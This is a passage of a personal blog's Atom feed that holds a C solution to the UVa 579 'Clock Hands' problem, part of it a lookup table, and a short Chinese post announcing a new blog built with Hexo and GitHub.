class="string">"122.000"</span>, <span class="string">"116.500"</span>, <span class="string">"111.000"</span>, <span class="string">"105.500"</span>, <span class="string">"100.000"</span>, <span class="string">"94.500"</span>, <span class="string">"89.000"</span>, <span class="string">"83.500"</span>, <span class="string">"78.000"</span>, <span class="string">"72.500"</span>, <span class="string">"67.000"</span>, <span class="string">"61.500"</span>, <span class="string">"56.000"</span>, <span class="string">"50.500"</span>, <span class="string">"45.000"</span>, <span class="string">"39.500"</span>, <span class="string">"34.000"</span>, <span class="string">"28.500"</span>, <span class="string">"23.000"</span>, <span class="string">"17.500"</span>, <span class="string">"12.000"</span>, <span class="string">"6.500"</span>, <span class="string">"1.000"</span>, <span class="string">"4.500"</span>, <span class="string">"10.000"</span>, <span class="string">"15.500"</span>, <span class="string">"21.000"</span>, <span class="string">"26.500"</span>, <span class="string">"32.000"</span>, <span class="string">"37.500"</span>, <span class="string">"43.000"</span>, <span class="string">"48.500"</span>, <span class="string">"54.000"</span>, <span class="string">"59.500"</span>, <span class="string">"65.000"</span>, <span class="string">"70.500"</span>, <span class="string">"76.000"</span>, <span class="string">"81.500"</span>, <span class="string">"87.000"</span>, <span class="string">"92.500"</span>, <span class="string">"98.000"</span>, <span class="string">"103.500"</span>, <span class="string">"109.000"</span>, <span class="string">"114.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"120.000"</span>, <span class="string">"125.500"</span>, <span class="string">"131.000"</span>, <span class="string">"136.500"</span>, <span class="string">"142.000"</span>, <span class="string">"147.500"</span>, <span class="string">"153.000"</span>, <span class="string">"158.500"</span>, <span class="string">"164.000"</span>, <span class="string">"169.500"</span>, <span class="string">"175.000"</span>, <span class="string">"179.500"</span>, <span class="string">"174.000"</span>, <span class="string">"168.500"</span>, <span class="string">"163.000"</span>, <span class="string">"157.500"</span>, <span class="string">"152.000"</span>, <span class="string">"146.500"</span>, <span class="string">"141.000"</span>, <span class="string">"135.500"</span>, <span class="string">"130.000"</span>, <span class="string">"124.500"</span>, <span class="string">"119.000"</span>, <span class="string">"113.500"</span>, <span class="string">"108.000"</span>, <span class="string">"102.500"</span>, <span class="string">"97.000"</span>, <span class="string">"91.500"</span>, <span class="string">"86.000"</span>, <span class="string">"80.500"</span>, <span class="string">"75.000"</span>, <span class="string">"69.500"</span>, <span class="string">"64.000"</span>, <span class="string">"58.500"</span>, <span class="string">"53.000"</span>, <span class="string">"47.500"</span>, <span class="string">"42.000"</span>, <span class="string">"36.500"</span>, <span class="string">"31.000"</span>, <span class="string">"25.500"</span>, <span class="string">"20.000"</span>, <span class="string">"14.500"</span>, <span class="string">"9.000"</span>, <span class="string">"3.500"</span>, <span class="string">"2.000"</span>, <span class="string">"7.500"</span>, <span class="string">"13.000"</span>, <span class="string">"18.500"</span>, <span class="string">"24.000"</span>, <span class="string">"29.500"</span>, <span class="string">"35.000"</span>, <span class="string">"40.500"</span>, <span class="string">"46.000"</span>, <span class="string">"51.500"</span>, <span class="string">"57.000"</span>, <span class="string">"62.500"</span>, <span class="string">"68.000"</span>, <span class="string">"73.500"</span>, <span class="string">"79.000"</span>, <span class="string">"84.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"90.000"</span>, <span class="string">"95.500"</span>, <span class="string">"101.000"</span>, <span class="string">"106.500"</span>, <span class="string">"112.000"</span>, <span class="string">"117.500"</span>, <span class="string">"123.000"</span>, <span class="string">"128.500"</span>, <span class="string">"134.000"</span>, <span class="string">"139.500"</span>, <span class="string">"145.000"</span>, <span class="string">"150.500"</span>, <span class="string">"156.000"</span>, <span class="string">"161.500"</span>, <span class="string">"167.000"</span>, <span class="string">"172.500"</span>, <span class="string">"178.000"</span>, <span class="string">"176.500"</span>, <span class="string">"171.000"</span>, <span class="string">"165.500"</span>, <span class="string">"160.000"</span>, <span class="string">"154.500"</span>, <span class="string">"149.000"</span>, <span class="string">"143.500"</span>, <span class="string">"138.000"</span>, <span class="string">"132.500"</span>, <span class="string">"127.000"</span>, <span class="string">"121.500"</span>, <span class="string">"116.000"</span>, <span class="string">"110.500"</span>, <span class="string">"105.000"</span>, <span class="string">"99.500"</span>, <span class="string">"94.000"</span>, <span class="string">"88.500"</span>, <span class="string">"83.000"</span>, <span class="string">"77.500"</span>, <span class="string">"72.000"</span>, <span class="string">"66.500"</span>, <span class="string">"61.000"</span>, <span class="string">"55.500"</span>, <span class="string">"50.000"</span>, <span class="string">"44.500"</span>, <span class="string">"39.000"</span>, <span class="string">"33.500"</span>, <span class="string">"28.000"</span>, <span class="string">"22.500"</span>, <span class="string">"17.000"</span>, <span class="string">"11.500"</span>, <span class="string">"6.000"</span>, <span class="string">"0.500"</span>, <span class="string">"5.000"</span>, <span class="string">"10.500"</span>, <span class="string">"16.000"</span>, <span class="string">"21.500"</span>, <span class="string">"27.000"</span>, <span class="string">"32.500"</span>, <span class="string">"38.000"</span>, <span class="string">"43.500"</span>, <span class="string">"49.000"</span>, <span class="string">"54.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"60.000"</span>, <span class="string">"65.500"</span>, <span class="string">"71.000"</span>, <span class="string">"76.500"</span>, <span class="string">"82.000"</span>, <span class="string">"87.500"</span>, <span class="string">"93.000"</span>, <span class="string">"98.500"</span>, <span class="string">"104.000"</span>, <span class="string">"109.500"</span>, <span class="string">"115.000"</span>, <span class="string">"120.500"</span>, <span class="string">"126.000"</span>, <span class="string">"131.500"</span>, <span class="string">"137.000"</span>, <span class="string">"142.500"</span>, <span class="string">"148.000"</span>, <span class="string">"153.500"</span>, <span class="string">"159.000"</span>, <span class="string">"164.500"</span>, <span class="string">"170.000"</span>, <span class="string">"175.500"</span>, <span class="string">"179.000"</span>, <span class="string">"173.500"</span>, <span class="string">"168.000"</span>, <span class="string">"162.500"</span>, <span class="string">"157.000"</span>, <span class="string">"151.500"</span>, <span class="string">"146.000"</span>, <span class="string">"140.500"</span>, <span class="string">"135.000"</span>, <span class="string">"129.500"</span>, <span class="string">"124.000"</span>, <span class="string">"118.500"</span>, <span class="string">"113.000"</span>, <span class="string">"107.500"</span>, <span class="string">"102.000"</span>, <span class="string">"96.500"</span>, <span class="string">"91.000"</span>, <span class="string">"85.500"</span>, <span class="string">"80.000"</span>, <span class="string">"74.500"</span>, <span class="string">"69.000"</span>, <span class="string">"63.500"</span>, <span class="string">"58.000"</span>, <span class="string">"52.500"</span>, <span class="string">"47.000"</span>, <span class="string">"41.500"</span>, <span class="string">"36.000"</span>, <span class="string">"30.500"</span>, <span class="string">"25.000"</span>, <span class="string">"19.500"</span>, <span class="string">"14.000"</span>, <span class="string">"8.500"</span>, <span class="string">"3.000"</span>, <span class="string">"2.500"</span>, <span class="string">"8.000"</span>, <span class="string">"13.500"</span>, <span class="string">"19.000"</span>, <span class="string">"24.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"30.000"</span>, <span class="string">"35.500"</span>, <span class="string">"41.000"</span>, <span class="string">"46.500"</span>, <span class="string">"52.000"</span>, <span class="string">"57.500"</span>, <span class="string">"63.000"</span>, <span class="string">"68.500"</span>, <span class="string">"74.000"</span>, <span class="string">"79.500"</span>, <span class="string">"85.000"</span>, <span class="string">"90.500"</span>, <span class="string">"96.000"</span>, <span class="string">"101.500"</span>, <span class="string">"107.000"</span>, <span class="string">"112.500"</span>, <span class="string">"118.000"</span>, <span class="string">"123.500"</span>, <span class="string">"129.000"</span>, <span class="string">"134.500"</span>, <span class="string">"140.000"</span>, <span class="string">"145.500"</span>, <span class="string">"151.000"</span>, <span class="string">"156.500"</span>, <span class="string">"162.000"</span>, <span class="string">"167.500"</span>, <span class="string">"173.000"</span>, <span class="string">"178.500"</span>, <span class="string">"176.000"</span>, <span class="string">"170.500"</span>, <span class="string">"165.000"</span>, <span class="string">"159.500"</span>, <span class="string">"154.000"</span>, <span class="string">"148.500"</span>, <span class="string">"143.000"</span>, <span class="string">"137.500"</span>, <span class="string">"132.000"</span>, <span class="string">"126.500"</span>, <span class="string">"121.000"</span>, <span class="string">"115.500"</span>, <span class="string">"110.000"</span>, <span class="string">"104.500"</span>, <span class="string">"99.000"</span>, <span class="string">"93.500"</span>, <span class="string">"88.000"</span>, <span class="string">"82.500"</span>, <span class="string">"77.000"</span>, <span class="string">"71.500"</span>, <span class="string">"66.000"</span>, <span class="string">"60.500"</span>, <span class="string">"55.000"</span>, <span class="string">"49.500"</span>, <span class="string">"44.000"</span>, <span class="string">"38.500"</span>, <span class="string">"33.000"</span>, <span class="string">"27.500"</span>, <span class="string">"22.000"</span>, <span class="string">"16.500"</span>, <span class="string">"11.000"</span>, <span class="string">"5.500"</span>&#125;,</div><div class="line">    &#123;<span class="string">"0.000"</span>, <span class="string">"5.500"</span>, <span class="string">"11.000"</span>, <span class="string">"16.500"</span>, <span class="string">"22.000"</span>, <span class="string">"27.500"</span>, <span class="string">"33.000"</span>, <span class="string">"38.500"</span>, <span class="string">"44.000"</span>, <span class="string">"49.500"</span>, <span class="string">"55.000"</span>, <span class="string">"60.500"</span>, <span class="string">"66.000"</span>, <span class="string">"71.500"</span>, <span class="string">"77.000"</span>, <span class="string">"82.500"</span>, <span class="string">"88.000"</span>, <span class="string">"93.500"</span>, <span class="string">"99.000"</span>, <span class="string">"104.500"</span>, <span class="string">"110.000"</span>, <span class="string">"115.500"</span>, <span class="string">"121.000"</span>, <span class="string">"126.500"</span>, <span class="string">"132.000"</span>, <span class="string">"137.500"</span>, <span class="string">"143.000"</span>, <span class="string">"148.500"</span>, <span class="string">"154.000"</span>, <span class="string">"159.500"</span>, <span class="string">"165.000"</span>, <span class="string">"170.500"</span>, <span class="string">"176.000"</span>, <span class="string">"178.500"</span>, <span class="string">"173.000"</span>, <span class="string">"167.500"</span>, <span class="string">"162.000"</span>, <span class="string">"156.500"</span>, <span class="string">"151.000"</span>, <span class="string">"145.500"</span>, <span class="string">"140.000"</span>, <span class="string">"134.500"</span>, <span class="string">"129.000"</span>, <span class="string">"123.500"</span>, <span class="string">"118.000"</span>, <span class="string">"112.500"</span>, <span class="string">"107.000"</span>, <span class="string">"101.500"</span>, <span class="string">"96.000"</span>, <span class="string">"90.500"</span>, <span class="string">"85.000"</span>, <span class="string">"79.500"</span>, <span class="string">"74.000"</span>, <span class="string">"68.500"</span>, <span class="string">"63.000"</span>, <span class="string">"57.500"</span>, <span class="string">"52.000"</span>, <span class="string">"46.500"</span>, <span class="string">"41.000"</span>, <span class="string">"35.500"</span>&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> h, m;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d:%d"</span>, &amp;h, &amp;m), h || m)</div><div class="line">        <span class="built_in">puts</span>(table[h][m]);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;題目連結：&lt;a href=&quot;https://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;amp;Itemid=8&amp;amp;category=24&amp;amp;page=show_problem&amp;amp;problem=520&quot;&gt;UVa 579 - Clock Hands&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;解法1&quot;&gt;&lt;a href=&quot;#解法1&quot; class=&quot;headerlink&quot; title=&quot;解法1&quot;&gt;&lt;/a&gt;解法1&lt;/h1&gt;&lt;p&gt;直接算角度相減，輸出小於等於180度角的部分 (0.030s)&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; h, m;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;float&lt;/span&gt; ang1, ang2, ans;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;scanf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%d:%d&quot;&lt;/span&gt;, &amp;amp;h, &amp;amp;m), h || m) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ang1 = h * &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt; + m * &lt;span class=&quot;number&quot;&gt;0.5&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ang2 = m * &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ans = &lt;span class=&quot;built_in&quot;&gt;fabs&lt;/span&gt;(ang1 - ang2);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ans &amp;gt; &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            ans = &lt;span class=&quot;number&quot;&gt;360&lt;/span&gt; - ans;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%.3f\n&quot;&lt;/span&gt;, ans);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Online Judge" scheme="https://andyw330.github.io/categories/Online-Judge/"/>
    
    
      <category term="UVa" scheme="https://andyw330.github.io/tags/UVa/"/>
    
  </entry>
  
  <entry>
    <title>Blog開張</title>
    <link href="https://andyw330.github.io/2017/03/12/hello-world/"/>
    <id>https://andyw330.github.io/2017/03/12/hello-world/</id>
    <published>2017-03-11T16:00:00.000Z</published>
    <updated>2017-03-12T14:57:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用-Hexo-Github-建-Blog"><a href="#使用-Hexo-Github-建-Blog" class="headerlink" title="使用 Hexo + Github 建 Blog"></a>使用 Hexo + Github 建 Blog</h1><p>先前用過 logdown 來寫文章，但覺得它的 editor 不是很好用，而且還有很多問題（escape問題、光標跑掉等等QQ），所以就放棄了。比對過各種架站方法跟套件，最後選擇用 Hexo + Github 來做，看起來非常自由，架起來也非常快速，而且用 Github hosting 沒煩惱！</p>
<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>一直說要另外架blog寫文章，說了好久都沒有行動，直到現在終於架起來啦！⎝(　ﾟ∀ﾟ)⎠<br>至於文章走向大概會是放些CTF跟Online Judge題目的解法、技術相關文章，還有一些記事吧。<br>只不過有沒有那個毅力跟時間去寫就不知道了QQ<br>請大家多多指教~ ˊˇˋ</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;使用-Hexo-Github-建-Blog&quot;&gt;&lt;a href=&quot;#使用-Hexo-Github-建-Blog&quot; class=&quot;headerlink&quot; title=&quot;使用 Hexo + Github 建 Blog&quot;&gt;&lt;/a&gt;使用 Hexo + Github 建 Bl
    
    </summary>
    
      <category term="Blog" scheme="https://andyw330.github.io/categories/Blog/"/>
    
    
      <category term="Blog" scheme="https://andyw330.github.io/tags/Blog/"/>
    
      <category term="Hexo" scheme="https://andyw330.github.io/tags/Hexo/"/>
    
      <category term="Github" scheme="https://andyw330.github.io/tags/Github/"/>
    
  </entry>
  
</feed>
